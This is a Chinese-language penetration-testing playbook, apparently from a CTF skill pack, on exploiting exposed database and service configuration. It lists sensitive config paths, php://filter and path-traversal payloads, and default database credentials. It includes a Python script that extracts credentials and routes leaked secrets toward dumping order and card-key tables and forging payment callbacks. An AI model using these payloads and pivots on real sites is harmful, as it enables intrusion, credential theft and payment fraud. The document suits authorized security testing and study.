# Database Config Exposure — 数据库配置泄露

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/24-database/04-config-exposure.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「见适用信号」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

本篇是清单/索引类文档，正文直接以条目给出打点项（见「技术正文」首节）：

- DOCUMENT_ROOT（网站根目录）
- DB_HOST / DB_USER / DB_PASS（如果配置了环境变量）
- `disable_functions`（可执行函数列表）
- `open_basedir`（目录访问限制）
- `Loaded Configuration File`（php.ini 路径）
- [[01-sqli-fundamentals]] — 获凭证后连接数据库
- [[03-nosql-injection]] — NoSQL 未授权
- [[05-backup-log-leak]] — 备份文件暴露

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。

## 步骤

1. **`.env` / `application.yml`** — 解析连接串，判断内网/公网/容器名
2. **`config/database.php`** — 关联表前缀和支付/订单表
3. **`web.config` / `appsettings.json`** — MSSQL/PostgreSQL 连接尝试与表名枚举
4. **`phpinfo()`** — 反推源码路径和 `php://filter` 读取路径
5. **`composer.lock` / `package-lock.json`** — 转入平台指纹与 CVE pipeline
6. **`STRIPE_SECRET`, `ALIPAY_PRIVATE_KEY`, `WECHATPAY_KEY`** — 构造合法回调或验证签名实现
7. **`127.0.0.1`, `localhost`** — 找 LFI/SSRF/命令执行入口
8. **`mysql`, `db`, `redis`** — 读 `docker-compose.yml`，确认容器网络
9. **`10.x`, `172.16-31.x`, `192.168.x`** — 走 SSRF/Gopher/内网代理
10. **`*.rds.amazonaws.com`, `*.aliyuncs.com`** — 判断公网可达、白名单、账号权限
11. **`unix_socket`** — LFI/RCE 后直连 socket

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **证据类型** — 泄露入口
- **证据类型** — 配置字段
- **证据类型** — 访问验证
- **证据类型** — 环境信息
- **证据类型** — 失败样本
- **证据类型** — 业务差分

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

> 配置文件、连接字符串、环境变量...数据库凭证泄露的常见路径与利用方法。

## 关键词

`配置泄露` `连接字符串` `.env` `config.php` `web.config` `数据库密码` `源码泄露` `备份文件` `phpinfo` `debug模式` `ThinkPHP配置` `Laravel .env` `Spring Boot` `Django settings`

## 0. 输入信号与凭证落点

配置泄露不要停在“文件可读”，要立刻判断凭证能打到哪里：本地 MySQL、内网 Redis、云 RDS、队列、对象存储，还是支付网关密钥。

| 输入信号 | 重点字段 | 下一步 |
|----------|----------|--------|
| `.env` / `application.yml` | `DB_HOST`, `DB_PORT`, `DATABASE_URL`, `REDIS_URL` | 解析连接串，判断内网/公网/容器名 |
| `config/database.php` | `host`, `database`, `username`, `password`, `prefix` | 关联表前缀和支付/订单表 |
| `web.config` / `appsettings.json` | `connectionStrings`, `DefaultConnection` | MSSQL/PostgreSQL 连接尝试与表名枚举 |
| `phpinfo()` | `DOCUMENT_ROOT`, `open_basedir`, 环境变量 | 反推源码路径和 `php://filter` 读取路径 |
| `composer.lock` / `package-lock.json` | 框架与支付 SDK 版本 | 转入平台指纹与 CVE pipeline |
| `STRIPE_SECRET`, `ALIPAY_PRIVATE_KEY`, `WECHATPAY_KEY` | 支付签名材料 | 构造合法回调或验证签名实现 |

## 1. 常见配置文件路径

### 1.1 PHP 应用

```
/.env                      # Laravel / Symfony
/.env.local                # 本地开发
/.env.production           # 生产环境
/config.php                # 自定义 PHP
/config/database.php       # Laravel / ThinkPHP
/application/database.php  # CodeIgniter
/app/config/database.php   # 旧版框架
/bootstrap/cache/config.php # Laravel 缓存
/thinkphp/.env             # ThinkPHP
```

### 1.2 Java 应用

```
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/WEB-INF/classes/application.yml
/src/main/resources/application.properties
/actuator/env              # Spring Boot Actuator
```

### 1.3 Python 应用

```
/.env
/settings.py
/local_settings.py
/config/settings.py
```

### 1.4 Node.js 应用

```
/.env
/config.js
/config/database.js
/server/config.js
```

### 1.5 ASP.NET

```
/web.config
/appsettings.json
/appsettings.Production.json
```

## 2. 备份文件暴露

```
config.php.bak
config.php~
config.php.save
config.php.swp
config.php.old
config.php.orig
config.php.txt
config.php.1
config.php_20250101
```

## 3. 版本控制泄露

```
/.git/HEAD                 → 然后 git-dumper
/.git/config               → 包含远程仓库地址
/.svn/entries              → SVN 泄露
/.svn/wc.db                → SVN 数据库
/.DS_Store                 → Mac 目录结构
```

## 4. PHP 源码读取

### 4.1 PHP Filter Wrapper

```
?file=php://filter/read=convert.base64-encode/resource=config.php
?file=php://filter/convert.base64-encode/resource=../config/database.php
```

### 4.2 文件包含

```
?page=../../.env
?template=../../../config/database.php
?mod=../config
```

### 4.3 路径遍历

```
?file=....//....//....//config.php
?download=....//....//....//.env
```

## 5. Debug 信息泄露

### 5.1 PHP

```
?phpinfo=1
?debug=1
PHP 错误堆栈泄露文件路径
ThinkPHP trace 页面
Laravel debugbar
Whoops error handler
```

### 5.2 Java

```
/actuator/env              # Spring Boot 环境变量
/actuator/configprops      # 配置属性
/actuator/mappings         # 路由映射
```

### 5.3 Python

```
DEBUG=True 时的 Django 错误页
Flask debug mode → 代码执行
```

## 6. 默认凭证

| 数据库 | 默认用户 | 默认密码 |
|--------|---------|---------|
| MySQL | root | (空) / root |
| PostgreSQL | postgres | postgres |
| MSSQL | sa | (空) / sa |
| Oracle | system / sys | manager / change_on_install |
| MongoDB | (无认证) | — |
| Redis | (无认证) | — |
| Elasticsearch | elastic | changeme (旧版) |
| phpMyAdmin | root | (空) |
| Adminer | (无认证) | — |

## 7. phpinfo() 信息泄露

```
?phpinfo=1
/info.php
/phpinfo.php
/test.php?phpinfo=1
```

从 phpinfo 可获取：
- DOCUMENT_ROOT（网站根目录）
- DB_HOST / DB_USER / DB_PASS（如果配置了环境变量）
- `disable_functions`（可执行函数列表）
- `open_basedir`（目录访问限制）
- `Loaded Configuration File`（php.ini 路径）

## 8. 连接串解析与下一跳生成

把泄露内容统一解析成结构化 JSON，后续 SQLi、备份、支付回调都能复用。

```python
import json
import re
from urllib.parse import urlparse, parse_qs

ENV_RX = re.compile(r"^([A-Z0-9_]+)\s*=\s*(.*)$", re.M)
DSN_RX = re.compile(r"(?P<scheme>mysql|postgres|postgresql|redis|mongodb|sqlserver)://[^\s'\"<>]+", re.I)

def parse_config_blob(text):
    env = {m.group(1): m.group(2).strip().strip("'\"") for m in ENV_RX.finditer(text)}
    dsns = []
    for m in DSN_RX.finditer(text):
        u = urlparse(m.group(0))
        dsns.append({
            "raw": m.group(0),
            "scheme": u.scheme,
            "host": u.hostname,
            "port": u.port,
            "user": u.username,
            "password_set": bool(u.password),
            "database": u.path.lstrip("/"),
            "query": parse_qs(u.query),
        })
    hints = []
    for k in ("DB_HOST", "MYSQL_HOST", "POSTGRES_HOST", "REDIS_HOST", "MONGO_HOST"):
        if k in env:
            hints.append({"type": "host_field", "key": k, "value": env[k]})
    for k in ("DB_DATABASE", "DB_USERNAME", "DB_PASSWORD", "DB_PORT"):
        if k in env:
            hints.append({"type": "db_field", "key": k, "value": env[k]})
    for k in ("STRIPE_SECRET", "ALIPAY_PRIVATE_KEY", "WECHATPAY_KEY", "PAY_KEY"):
        if k in env:
            hints.append({"type": "payment_secret", "key": k, "value_hint": env[k][:12]})
    return {"env": env, "dsns": dsns, "hints": hints}

if __name__ == "__main__":
    import sys
    print(json.dumps(parse_config_blob(open(sys.argv[1], encoding="utf-8", errors="ignore").read()), ensure_ascii=False, indent=2))
```

### 凭证作用域判定

| Host 形态 | 可能含义 | 动作 |
|-----------|----------|------|
| `127.0.0.1`, `localhost` | Web 与 DB 同机 | 找 LFI/SSRF/命令执行入口 |
| `mysql`, `db`, `redis` | Docker Compose 服务名 | 读 `docker-compose.yml`，确认容器网络 |
| `10.x`, `172.16-31.x`, `192.168.x` | 内网数据库 | 走 SSRF/Gopher/内网代理 |
| `*.rds.amazonaws.com`, `*.aliyuncs.com` | 云数据库 | 判断公网可达、白名单、账号权限 |
| `unix_socket` | 本机 socket | LFI/RCE 后直连 socket |

## 9. 支付配置与数据库凭证 Pivot

配置泄露命中后，优先把字段路由到“可产生业务结果”的链路。数据库凭证能抽订单账本，支付密钥能伪造或重放回调，对象存储能拿发货文件，Redis 能拿 session/队列。

| 字段 | 常见值 | 目标 | 下一跳 |
|---|---|---|---|
| `DB_*`, `DATABASE_URL` | MySQL/PostgreSQL/MSSQL | 订单、支付流水、卡密表 | SQLi / 直连抽表 |
| `REDIS_URL`, `CACHE_DRIVER` | Redis/cluster | session、购物车、队列 job | NoSQL / 队列发货 |
| `QUEUE_CONNECTION` | redis/database/sqs | 异步回调、发货任务 | payment-callback |
| `PAY_KEY`, `EPAY_KEY` | MD5/HMAC key | Epay/码支付回调 | signature implementation |
| `STRIPE_SECRET`, `PAYPAL_CLIENT_SECRET` | 第三方 API secret | 账单/订阅/退款状态 | payment-subscription |
| `OSS_*`, `S3_*` | bucket/key | 下载链接、卡密文件、备份 | backup-log-leak |

### 9.1 配置到攻击链路由器

```python
# config_pivot_router.py — 泄露配置到下一跳路线
ROUTES = {
    "db": ("DB_", "DATABASE_URL", "MYSQL_", "POSTGRES_", "SQLSERVER_"),
    "redis": ("REDIS_", "CACHE_", "SESSION_DRIVER", "QUEUE_CONNECTION"),
    "payment": ("PAY_", "EPAY_", "STRIPE_", "PAYPAL_", "ALIPAY_", "WECHATPAY_"),
    "storage": ("OSS_", "S3_", "COS_", "BUCKET"),
}

NEXT = {
    "db": "抽 orders/pay_log/cards/config 表，生成订单状态机",
    "redis": "枚举 session/cart/order/queue key，接发货与登录态",
    "payment": "枚举 sign_type/canonical/回调字段，转签名实现缺陷",
    "storage": "列 bucket/object 前缀，找备份、卡密、下载链接",
}

def route_config(env):
    out = []
    for name, prefixes in ROUTES.items():
        keys = [k for k in env if any(k.startswith(p) or k == p for p in prefixes)]
        if keys:
            out.append({"route": name, "keys": keys, "next": NEXT[name]})
    return out
```

### 9.2 连接后最小抽样

直连数据库后先做最小抽样，不要一上来全库导出：

```sql
SELECT DATABASE(), USER(), VERSION();
SHOW TABLES LIKE '%order%';
SHOW TABLES LIKE '%pay%';
SHOW TABLES LIKE '%card%';
SHOW TABLES LIKE '%config%';
SELECT id,out_trade_no,status,amount,paid_at FROM orders ORDER BY id DESC LIMIT 5;
SELECT order_id,trade_no,money,status,raw FROM pay_log ORDER BY id DESC LIMIT 5;
```

Evidence 保存 `config_pivot.json`、`db_min_sample.jsonl`、`payment_secret_probe.json`。成功样本是配置字段带来可复查的订单、回调、session、队列或发货差分；失败样本是凭证只在容器内可解析、账号权限不足且无业务表、支付 key 与当前网关不匹配。

## 攻击链 / 工作流

```
1. 枚举常见配置路径：.env、config.php、application.yml、settings.py、web.config
2. 结合目录遍历、源码泄露、备份文件、php filter 或 debug 页面读取配置
3. 提取连接字符串、DB_HOST、DB_USER、DB_PASS、Redis/Mongo URI 等字段
4. 判断凭证作用域：本地数据库、内网数据库、云 RDS、缓存服务、消息队列
5. 连接后先抓版本、当前库、当前用户、表名前缀和权限位
6. 关联后续链路：SQLi 文件读写、NoSQL 未授权、备份下载、管理后台登录、支付回调签名
7. 将 DB/Redis/Queue/Payment/Storage 配置路由到订单、队列、卡密、回调和对象存储
8. 记录泄露路径、字段片段、连接结果、下一跳入口和失败分支
```

## Evidence

| 证据类型 | 记录内容 |
|----------|----------|
| 泄露入口 | URL、参数、文件路径、状态码、响应长度 |
| 配置字段 | host/user/database/driver/port 字段样例 |
| 访问验证 | 登录成功、版本查询、权限边界 |
| 环境信息 | phpinfo/debug 页面中的 DOCUMENT_ROOT、open_basedir、框架版本 |
| 下一跳 | 可读表、可达内网服务、支付密钥、管理后台或备份路径 |
| 失败样本 | 403/404、连接超时、账号无权限、host 只在容器内解析 |
| 业务差分 | 订单、回调、队列、session、卡密或对象存储的可复查变化 |

## 10. 关联技术

- [[01-sqli-fundamentals]] — 获凭证后连接数据库
- [[03-nosql-injection]] — NoSQL 未授权
- [[05-backup-log-leak]] — 备份文件暴露
- [[../12-payment/payment-callback-async]] — 支付密钥与回调签名
- [[file-upload-xxe-lfi]] — 文件读取
